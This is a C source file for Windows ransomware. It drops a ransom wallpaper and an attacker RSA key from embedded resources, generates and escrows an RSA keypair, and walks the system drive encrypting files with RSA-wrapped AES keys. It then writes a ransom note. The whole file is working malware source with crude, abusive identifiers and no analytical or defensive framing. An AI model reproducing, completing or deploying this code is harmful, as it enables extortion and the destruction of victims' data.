#include "headers.h"
#pragma comment(lib, "bufferoverflowU.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(linker, "/ENTRY:briankrebsforhead")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
typedef struct keystructure {
	PUBLICKEYSTRUC publickeystruct;
	DWORD          keystructlen;
	BYTE           aeskeyg[aeskeylen];
} key_hdr;
typedef struct aesholder {
	HCRYPTKEY aeskeyg;
	BYTE      enc[encryptkey];
} aes_keytype;

BOOL Protects(LPCWSTR config) {
	CreateMutexW(NULL, FALSE, config);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return FALSE;
	}
	else{
		return TRUE;
	}
}
HCRYPTKEY rsakeyim(HCRYPTPROV hcryptprovt, CONST CHAR *file) {
	HCRYPTKEY aeskeyg = 0;
	BYTE      buf[2048];
	DWORD     keystructlen;
	HANDLE      *fd;
	fd = CreateFile(file, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fd != INVALID_HANDLE_VALUE) {
		BOOL  check = ReadFile(fd, buf, 2048, &keystructlen, NULL);
		if (!check) {
			return 0;
		}
		if (!CryptImportKey(hcryptprovt, buf, keystructlen, 0, CRYPT_EXPORTABLE, &aeskeyg)) {
		}
		CloseHandle(fd);
	}
	return aeskeyg;
}
VOID exprsakey(HCRYPTPROV hcryptprovt, HCRYPTKEY rsakeys, CONST CHAR *file, DWORD type, BOOL bEncrypt) {
	HCRYPTKEY ransomwarekey = 0;
	HANDLE out = NULL;
	BYTE      buf[2048], tmp[1024];
	PBYTE     p;
	DWORD     keystructlen, r;
	if (bEncrypt) {
		ransomwarekey = rsakeyim(hcryptprovt, ransomkey);
		if (ransomwarekey == 0) {
			return;
		}
	}
	out = CreateFile(file, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (out == INVALID_HANDLE_VALUE) {
		return;
	}
	if (out != NULL) {
		keystructlen = sizeof(buf);
		if (CryptExportKey(rsakeys, 0, type, 0, buf, &keystructlen)) {
			if (bEncrypt) {
				p = buf;
				while (keystructlen) {
					r = (keystructlen < 245) ? keystructlen : 245;
					_memcpy(tmp, p, r);
					keystructlen -= r;
					p += r;
					if (!CryptEncrypt(ransomwarekey, 0, TRUE, 0, tmp, &r, sizeof(tmp))) {
						break;
					}
					DWORD bw = 0;
					WriteFile(out, tmp, r, &bw, NULL);
				}
			}
			else {
				DWORD bw = 0;
				WriteFile(out, buf, keystructlen, &bw, NULL);
			}
		}
		else {
		}
		CloseHandle(out);
	}
	if (ransomwarekey != 0) {
		CryptDestroyKey(ransomwarekey);
	}
}
VOID generatersakey(VOID) {
	HCRYPTPROV hcryptprovt;
	HCRYPTKEY  aeskeyg;
	if (CryptAcquireContext(&hcryptprovt, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		if (CryptGenKey(hcryptprovt, AT_KEYEXCHANGE, (rsakeylen << 16) | CRYPT_EXPORTABLE, &aeskeyg)) {
			exprsakey(hcryptprovt, aeskeyg, publickey, PUBLICKEYBLOB, FALSE);
			exprsakey(hcryptprovt, aeskeyg, encryptedkey, PRIVATEKEYBLOB, TRUE);
			CryptDestroyKey(aeskeyg);
		}
		CryptReleaseContext(hcryptprovt, 0);
	}
}
aes_keytype* genaeskey(HCRYPTPROV hcryptprovt, HCRYPTKEY rsakeys, CONST CHAR *file) {
	aes_keytype *aes_key = 0;
	key_hdr   aeskeyg;
	FILE      *in;
	DWORD     mode, keystructlen;
	aes_key = HeapAlloc(GetProcessHeap(), 0, sizeof(aes_keytype));
	if (aes_key == NULL) {
		return 0;
	}
	if (file != NULL)
	{
		in = CreateFile(file, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (in != INVALID_HANDLE_VALUE) {
		BOOL check =	ReadFile(in, &aes_key->enc, encryptkey, &aeskeyg.keystructlen, NULL);
		if (!check) {
			return 0;
		}
			if (!CryptDecrypt(rsakeys, 0, TRUE, 0, aes_key->enc, &aeskeyg.keystructlen)) {
				return 0;
			}
			_memcpy(aeskeyg.aeskeyg, aes_key->enc, 16);
			CloseHandle(in);
		}
	}
	else {
		CryptGenRandom(hcryptprovt, aeskeylen, aeskeyg.aeskeyg);
		if (aes_key != 0) {
			_memcpy(aes_key->enc, aeskeyg.aeskeyg, 16);
		}
		keystructlen = aeskeylen;
		if (!CryptEncrypt(rsakeys, 0, TRUE, 0, aes_key->enc, &keystructlen, encryptkey)) {
			return 0;
		}
	}
	aeskeyg.publickeystruct.bType = PLAINTEXTKEYBLOB;
	aeskeyg.publickeystruct.bVersion = CUR_BLOB_VERSION;
	aeskeyg.publickeystruct.reserved = 0;
	aeskeyg.publickeystruct.aiKeyAlg = CALG_AES_128;
	aeskeyg.keystructlen = aeskeylen;
	if (CryptImportKey(hcryptprovt, (PBYTE)&aeskeyg, sizeof(aeskeyg), 0, CRYPT_NO_SALT, &aes_key->aeskeyg)) {
		mode = CRYPT_MODE_CBC;
		CryptSetKeyParam(aes_key->aeskeyg, KP_MODE, (PBYTE)&mode, 0);
	}
	return aes_key;
}
BOOL getridof(const CHAR *infile) {
	int doge;
	doge = DeleteFile(infile);
	if (doge != 0) {
		return TRUE;
	}
}
VOID encryptcontent(HCRYPTPROV hcryptprovt, HCRYPTKEY rsakeys, CONST CHAR *infile)
{
	HANDLE in = NULL, out = NULL;
	BYTE            *buf;
	DWORD           keystructlen, t;
	aes_keytype       *aes_key;
	DWORD bw = 0;
	LARGE_INTEGER fsize;

	in = CreateFile(infile, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (in == INVALID_HANDLE_VALUE) return;
	if (!GetFileSizeEx(in, &fsize)) {
		CloseHandle(in);
		return;
	}
	out = CreateFile(infile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (out != INVALID_HANDLE_VALUE)
	{
		aes_key = genaeskey(hcryptprovt, rsakeys, NULL);
		if (aes_key != NULL) {
			buf = HeapAlloc(GetProcessHeap(), 0, buffersize +1);
			if (buf != NULL)
			{
				LONGLONG read = 0;
				for (;;) {
					BOOL checks =  ReadFile(in, buf, MIN(buffersize - 16, fsize.QuadPart - read), &bw, NULL);
					if (!checks) {
						return; 
					}
					read += bw;
					keystructlen = bw;
					if (keystructlen == 0)
					{
						break;
					}
					if (keystructlen < (buffersize - 16)) {
						RtlSecureZeroMemory(buf, (buffersize - 16) - keystructlen);
						if ((keystructlen & 15)) {
							keystructlen = (keystructlen & -16) + 16;
						}
					}

					CryptEncrypt(aes_key->aeskeyg, 0, FALSE, 0, buf, &keystructlen, buffersize);
					WriteFile(out, buf, keystructlen, &bw, NULL);
				}
				SetFilePointer(out, 0, NULL, FILE_BEGIN);
				WriteFile(out, signature, signaturelen, &bw, NULL);
				t = encryptkey;
				WriteFile(out, &t, sizeof(t), &bw, NULL);
				WriteFile(out, aes_key->enc, encryptkey, &bw, NULL);
				t = 4;
				WriteFile(out, &t, sizeof(t), &bw, NULL);
				WriteFile(out, &fsize.QuadPart, sizeof(fsize.QuadPart), &bw, NULL);
				RtlSecureZeroMemory(buf, buffersize);
				HeapFree(GetProcessHeap(), 0, buf);
			}
			CryptDestroyKey(aes_key->aeskeyg);
			RtlSecureZeroMemory(aes_key, sizeof(aes_key));
			HeapFree(GetProcessHeap(), 0, aes_key);
		}
		CloseHandle(out);
	}
	CloseHandle(in);
} 
VOID encrypt_file(CONST CHAR *infile, INT enc) {
	HCRYPTPROV hcryptprovt = 0;
	HCRYPTKEY  rsakeys = 0;
	CHAR       *publickeyfile;
	if (CryptAcquireContext(&hcryptprovt, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		publickeyfile = publickey;
		rsakeys = rsakeyim(hcryptprovt, publickeyfile);
		if (rsakeys != 0) {
			encryptcontent(hcryptprovt, rsakeys, (CONST CHAR*)infile);
			CryptDestroyKey(rsakeys);
		}
		CryptReleaseContext(hcryptprovt, 0);
	}
}
VOID getthetampon(WORD period, LPTSTR periodblood)
{
	HRSRC periodpad = FindResource(NULL, MAKEINTRESOURCE(period), RT_RCDATA);
	if (periodpad != NULL) {

		HGLOBAL eminemisagod = LoadResource(NULL, periodpad);
		if (eminemisagod == NULL) {
			return;
		}
		LPVOID legsgiveout = LockResource(eminemisagod);
		DWORD eatanmcsheart = SizeofResource(NULL, periodpad);
		HANDLE checkmymouth = CreateFile(periodblood, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (checkmymouth == INVALID_HANDLE_VALUE) {
			return;
		}
		DWORD daddyinthecorner;
		WriteFile(checkmymouth, legsgiveout, eatanmcsheart, &daddyinthecorner, NULL);
		CloseHandle(checkmymouth);
		FreeResource(eminemisagod);

	}
}
VOID writenote() {
	CHAR *first = DROPNOTE;
	HANDLE note = NULL;
	TCHAR  ok[MAX_PATH];
	ExpandEnvironmentStrings(TEXT(NOTE), ok, MAX_PATH - 1);
	LPCTSTR ak = ok;
	note = CreateFile(ak, GENERIC_WRITE, 0, NULL, 2, 0x00000080, NULL);
	if (note == INVALID_HANDLE_VALUE) return;
	DWORD daddyinthecorner;
	WriteFile(note, first, stupid_strlen(first), &daddyinthecorner, NULL);
	CloseHandle(note);
}
VOID briankrebsforhead()
{

	TCHAR  ok[MAX_PATH] = "imageransomimage.jpg";
	WORD lol = PUBLOICRSA;
	LPTSTR ak = ok;
	getthetampon(lol, ak);
	WORD binz = FIRSTFILE;
	LPTSTR binzz = _T(ransomkey);
	getthetampon(binz, binzz);
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, ok, SPIF_UPDATEINIFILE);
	generatersakey(); 
	// yea this is not reliable at all lol...
	// if reg key shits is changed this could be bad... I really dont want to fuck with this so : )
	dirscan_config_t dir_config;
	TCHAR  systemdir[MAX_PATH];
	ExpandEnvironmentStrings(TEXT("%SystemDrive%"), systemdir, MAX_PATH - 1);
	dir_config.max_depth = 0 + 1000;
	dir_config.depth = 0 + 1;
	StrCat(systemdir, "\\");
	if (StrCpy(dir_config.path, systemdir) == 0) {
		return;
	}
	if (start_dirscan(&dir_config) != 0) {
		return;
	}
	writenote();
	return;
}